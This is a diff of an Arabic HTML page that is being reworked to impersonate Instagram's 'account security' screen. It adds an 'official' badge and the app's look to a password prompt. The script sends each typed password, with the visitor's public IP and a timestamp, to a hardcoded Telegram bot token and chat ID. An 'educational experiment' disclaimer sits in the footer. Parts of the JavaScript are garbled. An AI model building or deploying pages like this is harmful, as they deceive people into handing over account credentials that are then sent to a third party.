@@ -2,9 +2,10 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>اختبار أمان الحساب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Instagram - أمان الحساب</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
         * {
             margin: 0;
@@ -13,260 +14,356 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9ef 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            padding: 0;
+            margin: 0;
         }
 
-        .card {
-            background: #ffffff;
-            max-width: 420px;
+        /* ===== هاتف محاكي ===== */
+        .phone-frame {
             width: 100%;
-            padding: 32px 28px 28px;
-            border-radius: 32px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12), 0 8px 24px rgba(0, 0, 0, 0.05);
-            transition: transform 0.2s ease;
-            text-align: center;
+            max-width: 400px;
+            min-height: 100vh;
+            background: #ffffff;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.08);
+            position: relative;
+            display: flex;
+            flex-direction: column;
         }
 
-        .card:hover {
-            transform: translateY(-4px);
+        @media (min-width: 500px) {
+            .phone-frame {
+                min-height: 780px;
+                border-radius: 32px;
+                box-shadow: 0 20px 80px rgba(0, 0, 0, 0.15);
+                margin: 20px;
+            }
         }
 
+        /* ===== الهيدر ===== */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            padding: 12px 16px 8px;
+            border-bottom: 1px solid #efefef;
         }
 
-        .day {
-            font-size: 16px;
-            font-weight: 600;
-            color: #1a1a2e;
-            background: #f0f2f5;
-            padding: 6px 14px;
-            border-radius: 30px;
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
-        .time {
-            font-size: 16px;
-            font-weight: 600;
-            color: #1a1a2e;
-            background: #f0f2f5;
-            padding: 6px 14px;
-            border-radius: 30px;
+        .back-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #262626;
+            cursor: pointer;
+            padding: 4px;
         }
 
-        .domain {
-            display: inline-block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #4a4a6a;
-            background: #f0f2f5;
-            padding: 4px 16px;
-            border-radius: 30px;
-            margin-bottom: 22px;
-            direction: ltr;
-            unicode-bidi: embed;
+        .header-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #262626;
         }
 
-        .domain i {
-            color: #e1306c;
-            margin-left: 6px;
+        .header-actions {
+            display: flex;
+            gap: 16px;
+            color: #262626;
+            font-size: 22px;
         }
 
-        .icon-title {
+        .header-actions i {
+            cursor: pointer;
+        }
+
+        /* ===== صورة البروفايل ===== */
+        .profile-section {
+            display: flex;
+            align-items: center;
+            padding: 16px 16px 12px;
+            gap: 12px;
+            border-bottom: 1px solid #efefef;
+        }
+
+        .avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            margin-bottom: 6px;
-        }
-
-        .icon-title i {
-            font-size: 32px;
-            color: #e1306c;
-            background: #fde8ef;
-            padding: 12px;
-            border-radius: 50%;
-        }
-
-        .icon-title h2 {
-            font-size: 26px;
+            color: #fff;
+            font-size: 22px;
             font-weight: 700;
-            color: #1a1a2e;
+            flex-shrink: 0;
+            border: 2px solid #fff;
+            box-shadow: 0 0 0 1px #dbdbdb;
         }
 
-        .subtitle {
-            font-size: 16px;
-            font-weight: 500;
-            color: #4a4a6a;
-            margin-bottom: 22px;
-            border-bottom: 2px dashed #e6e9ef;
-            padding-bottom: 14px;
+        .profile-info {
+            flex: 1;
         }
 
-        .input-group {
+        .profile-name {
+            font-size: 15px;
+            font-weight: 700;
+            color: #262626;
+        }
+
+        .profile-sub {
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+
+        .profile-badge {
+            background: #0095f6;
+            color: #fff;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-right: 6px;
+        }
+
+        /* ===== المحتوى الرئيسي ===== */
+        .main-content {
+            flex: 1;
+            padding: 20px 16px 16px;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .security-badge i {
+            font-size: 14px;
+        }
+
+        .main-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #262626;
+            margin-bottom: 4px;
+        }
+
+        .main-sub {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        /* ===== حقل الإدخال ===== */
+        .input-wrapper {
             position: relative;
-            margin-bottom: 16px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            transition: all 0.2s ease;
         }
 
-        .input-group i {
+        .input-wrapper:focus-within {
+            border-color: #262626;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.05);
+        }
+
+        .input-wrapper i {
             position: absolute;
-            right: 18px;
+            right: 14px;
             top: 50%;
             transform: translateY(-50%);
-            color: #9a9abf;
+            color: #8e8e8e;
             font-size: 18px;
+            transition: color 0.2s ease;
         }
 
-        .input-group input {
+        .input-wrapper:focus-within i {
+            color: #262626;
+        }
+
+        .input-wrapper input {
             width: 100%;
-            padding: 16px 52px 16px 20px;
-            font-size: 18px;
-            border: 2px solid #e6e9ef;
-            border-radius: 60px;
-            background: #fafbff;
+            padding: 14px 48px 14px 16px;
+            font-size: 16px;
+            border: none;
+            background: transparent;
             outline: none;
-            transition: all 0.3s ease;
             font-weight: 500;
-            color: #1a1a2e;
+            color: #262626;
             direction: ltr;
             text-align: right;
+            font-family: inherit;
         }
 
-        .input-group input:focus {
-            border-color: #e1306c;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(225, 48, 108, 0.12);
-        }
-
-        .input-group input::placeholder {
-            color: #b0b0d0;
+        .input-wrapper input::placeholder {
+            color: #8e8e8e;
             font-weight: 400;
-            font-size: 16px;
         }
 
-        .strength-meter {
+        .toggle-visibility {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8e8e8e;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .toggle-visibility:hover {
+            color: #262626;
+        }
+
+        /* ===== مؤشر القوة ===== */
+        .strength-container {
+            margin: 16px 0 14px;
+        }
+
+        .strength-labels {
             display: flex;
-            gap: 6px;
-            margin: 6px 0 18px;
-            justify-content: center;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 600;
+            color: #8e8e8e;
+            margin-bottom: 4px;
         }
 
-        .strength-meter .bar {
-            width: 30%;
-            height: 6px;
-            border-radius: 10px;
-            background: #e6e9ef;
-            transition: background 0.3s ease;
+        .strength-track {
+            display: flex;
+            gap: 4px;
+            height: 4px;
+            background: #efefef;
+            border-radius: 4px;
+            overflow: hidden;
         }
 
-        .strength-meter .bar.active.weak { background: #ff4d4d; }
-        .strength-meter .bar.active.medium { background: #ffaa33; }
-        .strength-meter .bar.active.strong { background: #2ecc71; }
+        .strength-track .segment {
+            flex: 1;
+            height: 100%;
+            background: #efefef;
+            border-radius: 4px;
+            transition: all 0.4s ease;
+        }
+
+        .strength-track .segment.weak { background: #ed4956; }
+        .strength-track .segment.medium { background: #f99b3d; }
+        .strength-track .segment.strong { background: #4caf50; }
+        .strength-track .segment.very-strong { background: #2e7d32; }
 
         .strength-text {
             font-size: 13px;
             font-weight: 500;
-            color: #4a4a6a;
-            margin-bottom: 18px;
-            min-height: 20px;
+            color: #8e8e8e;
+            margin-top: 6px;
+            text-align: center;
         }
 
-        .btn {
+        .strength-text strong {
+            color: #262626;
+        }
+
+        /* ===== متطلبات كلمة المرور ===== */
+        .requirements {
+            margin: 16px 0 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 6px 16px;
+        }
+
+        .req-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #8e8e8e;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .req-item i {
+            font-size: 14px;
+            width: 18px;
+            color: #dbdbdb;
+            transition: color 0.3s ease;
+        }
+
+        .req-item.done {
+            color: #262626;
+        }
+
+        .req-item.done i {
+            color: #4caf50;
+        }
+
+        /* ===== الزر ===== */
+        .btn-submit {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #e1306c, #c13584);
+            padding: 14px;
+            background: #0095f6;
             border: none;
-            border-radius: 60px;
+            border-radius: 12px;
             color: #fff;
-            font-size: 20px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 24px rgba(225, 48, 108, 0.30);
-        }
-
-        .btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 32px rgba(225, 48, 108, 0.40);
-        }
-
-        .btn:active {
-            transform: scale(0.97);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        .languages {
-            margin-top: 22px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #6a6a8a;
-        }
-
-        .languages span {
-            cursor: pointer;
-            transition: color 0.2s ease;
-            padding: 4px 8px;
-            border-radius: 20px;
-        }
-
-        .languages span:hover {
-            color: #e1306c;
-            background: #fde8ef;
-        }
-
-        .languages .divider {
-            color: #d0d0e0;
-            cursor: default;
-        }
-
-        .languages .divider:hover {
-            background: transparent;
-            color: #d0d0e0;
-        }
-
-        .warning {
-            margin-top: 20px;
-            padding: 12px 16px;
-            background: #fef6f9;
-            border-radius: 60px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #b84a7a;
-            border: 1px solid #fce4ed;
+            transition: all 0.2s ease;
+            font-family: inherit;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
 
-        .warning i {
-            color: #e1306c;
-            font-size: 16px;
+        .btn-submit:hover {
+            background: #0081d6;
         }
 
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-submit i {
+            font-size: 18px;
+        }
+
+        /* ===== الرسالة ===== */
         .toast {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 60px;
-            font-size: 14px;
+            margin-top: 14px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 13px;
             font-weight: 500;
             display: none;
+            text-align: center;
             transition: all 0.3s ease;
         }
 
@@ -275,114 +372,278 @@
         }
 
         .toast.success {
-            background: #e8f8ef;
-            color: #1a7a4a;
-            border: 1px solid #b8e6cf;
+            background: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
         }
 
         .toast.error {
-            background: #fde8ec;
-            color: #b33a4a;
-            border: 1px solid #fcccd6;
+            background: #fce4ec;
+            color: #c62828;
+            border: 1px solid #f8bbd0;
         }
 
         .toast.info {
-            background: #e8f0fe;
-            color: #1a4a7a;
-            border: 1px solid #b8cce6;
+            background: #e3f2fd;
+            color: #0d47a1;
+            border: 1px solid #bbdefb;
         }
 
-        @media (max-width: 480px) {
-            .card { padding: 24px 18px 20px; }
-            .icon-title h2 { font-size: 22px; }
-            .input-group input { font-size: 16px; padding: 14px 48px 14px 16px; }
-            .btn { font-size: 18px; padding: 14px; }
-            .day, .time { font-size: 14px; padding: 4px 12px; }
+        /* ===== الفوتر ===== */
+        .footer {
+            padding: 12px 16px 20px;
+            border-top: 1px solid #efefef;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-bottom: 8px;
+        }
+
+        .footer-links span {
+            cursor: pointer;
+        }
+
+        .footer-links span:hover {
+            color: #262626;
+        }
+
+        .footer-warning {
+            font-size: 11px;
+            color: #8e8e8e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .footer-warning i {
+            color: #ed4956;
+        }
+
+        /* ===== شريط أسفل ===== */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0 12px;
+            border-top: 1px solid #efefef;
+            background: #fff;
+            margin-top: auto;
+        }
+
+        .bottom-nav i {
+            font-size: 24px;
+            color: #8e8e8e;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .bottom-nav i:hover {
+            color: #262626;
+        }
+
+        .bottom-nav i.active {
+            color: #262626;
+        }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 400px) {
+            .requirements {
+                grid-template-columns: 1fr;
+            }
+            .main-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
+    <div class="phone-frame">
 
+        <!-- ===== الهيدر ===== -->
         <div class="header">
-            <span class="day">الثلاثاء</span>
-            <span class="time">6:41</span>
+            <div class="header-left">
+                <button class="back-btn"><i class="fas fa-chevron-right"></i></button>
+                <span class="header-title">أمان الحساب</span>
+            </div>
+            <div class="header-actions">
+                <i class="fas fa-ellipsis-h"></i>
+            </div>
         </div>
 
-        <div class="domain">
-            <i class="fab fa-instagram"></i> dk6myfgf2g-tech.github.io
+        <!-- ===== البروفايل ===== -->
+        <div class="profile-section">
+            <div class="avatar">I</div>
+            <div class="profile-info">
+                <div class="profile-name">
+                    Instagram
+                    <span class="profile-badge">رسمي</span>
+                </div>
+                <div class="profile-sub">مركز المساعدة • الأمان</div>
+            </div>
+            <i class="fas fa-chevron-left" style="color:#8e8e8e; font-size:14px;"></i>
         </div>
 
-        <div class="icon-title">
-            <i class="fas fa-shield-alt"></i>
-            <h2>أمان حسابك</h2>
+        <!-- ===== المحتوى ===== -->
+        <div class="main-content">
+
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                اختبار أمان
+            </div>
+
+            <h1 class="main-title">كلمة مرور قوية</h1>
+            <p class="main-sub">استخدم كلمة مرور فريدة لحماية حسابك</p>
+
+            <!-- ===== حقل الإدخال ===== -->
+            <div class="input-wrapper">
+                <i class="fas fa-key"></i>
+                <input type="password" id="passwordInput" placeholder="اكتب كلمة مرور قوية" />
+                <button class="toggle-visibility" id="togglePassword">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+
+            <!-- ===== مؤشر القوة ===== -->
+            <div class="strength-container">
+                <div class="strength-labels">
+                    <span>ضعيفة</span>
+                    <span>قوية</span>
+                </div>
+                <div class="strength-track" id="strengthTrack">
+                    <div class="segment" id="seg1"></div>
+                    <div class="segment" id="seg2"></div>
+                    <div class="segment" id="seg3"></div>
+                    <div class="segment" id="seg4"></div>
+                </div>
+                <div class="strength-text" id="strengthText">💡 ابدأ بكتابة كلمة مرور</div>
+            </div>
+
+            <!-- ===== المتطلبات ===== -->
+            <div class="requirements" id="requirements">
+                <div class="req-item" id="reqLength"><i class="fas fa-circle"></i> 8 أحرف على الأقل</div>
+                <div class="req-item" id="reqUpper"><i class="fas fa-circle"></i> حرف كبير وصغير</div>
+                <div class="req-item" id="reqNumber"><i class="fas fa-circle"></i> رقم واحد على الأقل</div>
+                <div class="req-item" id="reqSpecial"><i class="fas fa-circle"></i> رمز خاص (!@#$)</div>
+            </div>
+
+            <!-- ===== زر الإرسال ===== -->
+            <button class="btn-submit" id="submitBtn">
+                <i class="fas fa-paper-plane"></i>
+                إرسال
+            </button>
+
+            <!-- ===== رسالة ===== -->
+            <div class="toast" id="toast"></div>
+
         </div>
-        <div class="subtitle">اختبار تجريبي</div>
 
-        <div class="input-group">
-            <i class="fas fa-key"></i>
-            <input type="text" id="passwordInput" placeholder="اكتب كلمة قوية" />
+        <!-- ===== الفوتر ===== -->
+        <div class="footer">
+            <div class="footer-links">
+                <span>مساعدة</span>
+                <span>سياسة الخصوصية</span>
+                <span>شروط الخدمة</span>
+            </div>
+            <div class="footer-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                تجربة تعليمية — لا تدخل معلومات حساسة
+            </div>
         </div>
 
-        <div class="strength-meter" id="strengthMeter">
-            <span class="bar" id="bar1"></span>
-            <span class="bar" id="bar2"></span>
-            <span class="bar" id="bar3"></span>
+        <!-- ===== شريط التنقل السفلي ===== -->
+        <div class="bottom-nav">
+            <i class="fas fa-home"></i>
+            <i class="fas fa-search"></i>
+            <i class="fas fa-plus-square"></i>
+            <i class="fas fa-heart"></i>
+            <i class="fas fa-user-circle active"></i>
         </div>
-        <div class="strength-text" id="strengthText">💡 ابدأ بكتابة كلمة مرور</div>
-
-        <button class="btn" id="submitBtn">إرسال</button>
-
-        <div class="languages">
-            <span>Français</span>
-            <span class="divider">/</span>
-            <span>English</span>
-        </div>
-
-        <div class="warning">
-            <i class="fas fa-exclamation-triangle"></i>
-            تجربة تعليمية — لا تدخل معلومات حساسة
-        </div>
-
-        <div class="toast" id="toast"></div>
 
     </div>
 
     <script>
         (function() {
             // ============================================================
-            // ✅ تم تحديث البيانات الخاصة بك
+            // ✅ بيانات التلغرام الخاصة بك
             // ============================================================
             const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
-            const CHAT_ID = '5775368729'; // يمكنك استخدام @username أيضاً
+            const CHAT_ID = '5775368729';
 
             // ============================================================
             const input = document.getElementById('passwordInput');
-            const bar1 = document.getElementById('bar1');
-            const bar2 = document.getElementById('bar2');
-            const bar3 = document.getElementById('bar3');
+            const seg1 = document.getElementById('seg1');
+            const seg2 = document.getElementById('seg2');
+            const seg3 = document.getElementById('seg3');
+            const seg4 = document.getElementById('seg4');
             const strengthText = document.getElementById('strengthText');
             const submitBtn = document.getElementById('submitBtn');
             const toast = document.getElementById('toast');
+            const toggleBtn = document.getElementById('togglePassword');
+            const reqLength = document.getElementById('reqLength');
+            const reqUpper = document.getElementById('reqUpper');
+            const reqNumber = document.getElementById('reqNumber');
+            const reqSpecial = document.getElementById('reqSpecial');
 
             let isSending = false;
+            let isVisible = false;
+
+            // ===== إظهار/إخفاء كلمة المرور =====
+            toggleBtn.addEventListener('click', function() {
+                isVisible = !isVisible;
+                input.type = isVisible ? 'text' : 'password';
+                this.querySelector('i').className = isVisible ? 'fas fa-eye-slash' : 'fas fa-eye';
+            });
 
             // ===== تقييم القوة =====
             function evaluateStrength(password) {
                 let score = 0;
-                if (password.length >= 6) score++;
-                if (password.length >= 10) score++;
-                if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score++;
-                if (/\d/.test(password)) score++;
-                if (/[^a-zA-Z0-9]/.test(password)) score++;
+                const checks = {
+                    length: password.length >= 8,
+                    upper: /[a-z]/.test(password) && /[A-Z]/.test(password),
+                    number: /\d/.test(password),
+                    special: /[^a-zA-Z0-9]/.test(password)
+                };
 
-                if (password.length === 0) return { level: 0, label: '💡 ابدأ بكتابة كلمة مرور' };
+                if (checks.length) score++;
+                if (checks.upper) score++;
+                if (checks.number) score++;
+                if (checks.special) score++;
+
+                // تحديث المتطلبات
+               : updateRequirements checks(checks);
+
+                if (password.length.length === 0) return { level:  },
+0, label: '💡 ابدأ بكتابة كلمة مرور' };
                 if (score <= 1) return { level: 1, label: '🔴 ضعيفة جداً' };
                 if (score === 2) return { level: 2, label: '🟠 ضعيفة' };
                 if (score === 3) return { level: 3, label: '🟡 متوسطة' };
-                if (score === 4) return { level: 4, label: '🟢 قوية' };
-                return { level: 5, label: '🟣 قوية جداً' };
+                if (score === 4) return { level: 4, label: '🟢 قوية جداً' };
+                return { level: 5, label: '🟣 ممتازة!' };
+            }
+
+            // ===== تحديث المتطلبات =====
+            function updateRequirements(checks) {
+                const items = [
+                    { el: reqLength, done                    { el: reqUpper, done: checks.upper },
+                    { el: reqNumber, done: checks.number },
+                    { el: reqSpecial, done: checks.special }
+                ];
+                items.forEach(({ el, done }) => {
+                    if (done) {
+                        el.classList.add('done');
+                        el.querySelector('i').className = 'fas fa-check-circle';
+                    } else {
+                        el.classList.remove('done');
+                        el.querySelector('i').className = 'fas fa-circle';
+                    }
+                });
             }
 
             // ===== تحديث المؤشر =====
@@ -390,23 +651,18 @@
                 const result = evaluateStrength(password);
                 const level = result.level;
 
-                [bar1, bar2, bar3].forEach(bar => bar.className = 'bar');
+                const segments = [seg1, seg2, seg3, seg4];
+                segments.forEach((seg, i) => {
+                    seg.className = 'segment';
+                    if (i < level) {
+                        if (level <= 1) seg.classList.add('weak');
+                        else if (level === 2) seg.classList.add('medium');
+                        else if (level === 3) seg.classList.add('strong');
+                        else if (level >= 4) seg.classList.add('very-strong');
+                    }
+                });
 
-                if (level >= 1) bar1.classList.add('active', 'weak');
-                if (level >= 2) bar2.classList.add('active', 'medium');
-                if (level >= 3) bar3.classList.add('active', 'strong');
-
-                if (level >= 4) {
-                    bar1.className = 'bar active strong';
-                    bar2.className = 'bar active strong';
-                    bar3.className = 'bar active strong';
-                }
-
-                if (level === 0) {
-                    [bar1, bar2, bar3].forEach(bar => bar.className = 'bar');
-                }
-
-                strengthText.textContent = result.label;
+                strengthText.innerHTML = result.label;
                 return result;
             }
 
@@ -423,16 +679,14 @@
                 const timeStr = now.toLocaleString('ar-EG', { hour12: true });
                 const ip = await getIP();
 
-                const message = `
-        🛡️ *اختبار أمان الحساب*
+                const message = `🛡️ *Instagram - أمان الحساب*
         ─────────────
         🔑 كلمة المرور: \`${password}\`
         📊 القوة: ${strength.label}
         ⏰ الوقت: ${timeStr}
         🌐 IP: ${ip || 'غير متاح'}
         ─────────────
-        ⚠️ تجربة تعليمية فقط
-        `;
+        ⚠️ تجربة تعليمية فقط`;
 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -447,19 +701,15 @@
                             disable_web_page_preview: true
                         })
                     });
-
                     const data = await response.json();
-                    if (!data.ok) {
-                        throw new Error(data.description || 'فشل الإرسال');
-                    }
+                    if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
                     return { success: true };
                 } catch (error) {
-                    console.error('Telegram error:', error);
                     return { success: false, error: error.message };
                 }
             }
 
-            // ===== جلب IP العام =====
+            // ===== جلب IP =====
             function getIP() {
                 return fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
